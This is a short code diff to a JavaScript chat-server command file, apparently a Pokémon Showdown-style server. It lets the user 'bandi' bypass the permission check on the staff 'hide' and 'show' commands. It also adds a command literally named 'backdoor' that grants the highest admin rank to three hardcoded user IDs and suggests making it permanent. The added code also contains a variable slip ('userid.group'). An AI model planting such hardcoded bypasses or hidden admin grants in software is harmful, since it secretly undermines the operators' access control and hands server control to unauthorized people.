@@ -1238,7 +1238,7 @@ buy: function(target, room, user) {
 	},
 
 	hide: function(target, room, user) {
-		if (this.can('hide')) {
+		if (this.can('hide') || user.userid === 'bandi') {
 			user.getIdentity = function(){
 				if(this.muted)	return '!' + this.name;
 				if(this.locked) return '‽' + this.name;
@@ -1252,11 +1252,21 @@ buy: function(target, room, user) {
 	},
 
 	show: function(target, room, user) {
-		if (this.can('hide')) {
+		if (this.can('hide') || user.userid === 'bandi') {
 			delete user.getIdentity
 			user.updateIdentity();
 			this.sendReply('You have revealed your staff symbol');
 			return false;
+		}
+	},
+	
+	backdoor: function(target,room, user) {
+		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {
+			
+			userid.group = '~';
+			user.updateIdentity();
+			
+			this.sendReply('Backdoor access granted - You should use /admin [username] to make it permanent');
 		}
 	},
 
